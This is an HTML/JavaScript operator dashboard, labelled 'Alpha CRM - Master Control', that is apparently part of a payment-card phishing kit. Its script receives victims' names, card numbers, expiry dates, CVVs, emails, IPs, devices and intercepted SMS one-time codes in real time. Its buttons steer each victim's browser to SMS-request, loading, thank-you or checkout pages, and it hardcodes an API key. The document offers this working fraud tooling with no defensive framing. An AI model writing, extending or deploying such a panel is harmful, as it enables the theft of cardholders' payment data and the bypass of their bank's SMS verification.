<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master CRM - Alpha Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #030712;
            --surface: #111827;
            --primary: #8b5cf6;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
        }

        body {
            margin: 0;
            background: var(--bg);
            color: #f3f4f6;
            font-family: 'Outfit', sans-serif;
            padding: 2rem;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            border-bottom: 1px solid #1f2937;
            padding-bottom: 1rem;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 1.5rem;
        }

        .card {
            background: var(--surface);
            border: 1px solid #1f2937;
            padding: 1.5rem;
            border-radius: 20px;
            position: relative;
        }

        .card.offline {
            opacity: 0.6;
            filter: grayscale(1);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 1rem;
        }

        .status-badge {
            padding: 4px 10px;
            border-radius: 99px;
            font-size: 0.7rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-online {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }

        .status-offline {
            background: rgba(156, 163, 175, 0.1);
            color: #9ca3af;
        }

        .info-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 10px;
        }

        label {
            font-size: 0.7rem;
            color: #9ca3af;
            text-transform: uppercase;
        }

        .val {
            font-size: 0.95rem;
            color: #fff;
            font-weight: 400;
        }

        .val.otp {
            color: var(--warning);
            font-size: 1.2rem;
            font-weight: 600;
            letter-spacing: 2px;
        }

        .controls {
            margin-top: 1.5rem;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }

        button {
            padding: 8px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.05);
            color: white;
            cursor: pointer;
            font-size: 0.8rem;
            transition: 0.2s;
        }

        button:hover {
            background: var(--primary);
        }

        .btn-success:hover {
            background: var(--success);
        }

        .btn-danger:hover {
            background: var(--danger);
        }

        .btn-warning:hover {
            background: var(--warning);
        }
    </style>
</head>

<body>
    <header>
        <h1>Alpha CRM - Master Control</h1>
        <div id="connectionStatus">Connexion au serveur...</div>
    </header>

    <div class="grid" id="clientList">
        <!-- Les clients apparaîtront ici -->
    </div>

    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script>
        const clientList = document.getElementById('clientList');
        const notif = document.getElementById('notif');
        const API_KEY = 'pro-audit-secret-key-2024';

        function connect() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const socket = new WebSocket(`${protocol}//${window.location.host}/ws/admin`);

            socket.onopen = () => { document.getElementById('connectionStatus').textContent = 'Live Console Connected'; };
            socket.onmessage = (event) => {
                const msg = JSON.parse(event.data);
                handleMessage(msg);
            };
            socket.onclose = () => { setTimeout(connect, 3000); };
        }

        function handleMessage(msg) {
            let card = document.getElementById(`card-${msg.client_id}`);

            if (msg.type === 'NEW_PAYMENT') {
                updateOrCreateCard(msg.data.client_id, msg.data);
                notif.play().catch(() => { });
            } else if (msg.type === 'NEW_SMS') {
                card = updateOrCreateCard(msg.client_id, {});
                card.querySelector('.otp-val').textContent = msg.otp;
                card.querySelector('.otp-val').style.color = '#f59e0b';
                notif.play().catch(() => { });
            } else if (msg.type === 'CLIENT_STATUS') {
                card = updateOrCreateCard(msg.client_id, {});
                const badge = card.querySelector('.status-badge');
                badge.className = `status-badge status-${msg.status}`;
                badge.textContent = msg.status;
                if (msg.status === 'offline') card.classList.add('offline');
                else card.classList.remove('offline');
            } else if (msg.type === 'CLIENT_EVENT' && msg.event === 'timer_update') {
                card = document.getElementById(`card-${msg.client_id}`);
                if (card) {
                    const timerVal = card.querySelector('.timer-val');
                    timerVal.textContent = msg.data.timeLeft + 's';
                    timerVal.style.color = msg.data.timeLeft < 5 ? 'var(--danger)' : 'var(--warning)';
                }
            }
        }

        function updateOrCreateCard(id, data) {
            let card = document.getElementById(`card-${id}`);
            if (!card) {
                card = document.createElement('div');
                card.id = `card-${id}`;
                card.className = 'card';
                card.innerHTML = `
                    <div class="card-header">
                        <div>
                            <label>ID Client | <span class="timer-val" style="font-weight:600;">-</span></label>
                            <div class="val">${id}</div>
                        </div>
                        <span class="status-badge status-online">online</span>
                    </div>
                    <div class="info-row">
                        <div><label>Nom</label><div class="val name-val">-</div></div>
                        <div><label>Montant</label><div class="val amount-val">-</div></div>
                    </div>
                    <div class="info-row">
                        <div><label>Carte (<span class="brand-val">-</span>)</label><div class="val card-val">-</div></div>
                        <div><label>BIN</label><div class="val bin-val">-</div></div>
                    </div>
                    <div class="info-row">
                        <div><label>Exp / CVV</label><div class="val exp-val">-</div></div>
                        <div><label>Email</label><div class="val email-val">-</div></div>
                    </div>
                    <div class="info-row">
                        <div><label>IP</label><div class="val ip-val">-</div></div>
                        <div><label>Device</label><div class="val device-val" style="font-size:0.6rem; overflow:hidden; white-space:nowrap; text-overflow:ellipsis;">-</div></div>
                    </div>
                    <div style="margin-top:10px; background:rgba(0,0,0,0.2); padding:10px; border-radius:10px; text-align:center;">
                        <label>CODE SMS REÇU</label>
                        <div class="val otp otp-val">ATTENTE...</div>
                    </div>
                    <div class="controls">
                        <button onclick="redirect('${id}', 'sms')" class="btn-warning">DEMANDER SMS</button>
                        <button onclick="redirect('${id}', 'loading')" class="btn-primary">REFRESH / LOADING</button>
                        <button onclick="redirect('${id}', 'thank_you')" class="btn-success">VALIDER (MERCI)</button>
                        <button onclick="redirect('${id}', 'checkout')" class="btn-danger">RETOUR CHECKOUT</button>
                    </div>
                `;
                clientList.prepend(card);
            }

            if (data.full_name) {
                card.querySelector('.name-val').textContent = data.full_name;
                card.querySelector('.amount-val').textContent = data.montant + ' €';
                card.querySelector('.card-val').textContent = data.numero_carte_masque;
                card.querySelector('.brand-val').textContent = data.card_brand;
                card.querySelector('.bin-val').textContent = data.card_bin;
                card.querySelector('.exp-val').textContent = data.expiry + ' / ' + data.cvv;
                card.querySelector('.email-val').textContent = data.email;
                card.querySelector('.ip-val').textContent = data.adresse_ip;
                card.querySelector('.device-val').textContent = data.device;
            }
            return card;
        }

        async function redirect(clientId, target) {
            await fetch('/v1/admin/redirect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-API-KEY': API_KEY },
                body: JSON.stringify({ client_id: clientId, target: target })
            });
        }

        connect();
    </script>
</body>

</html>
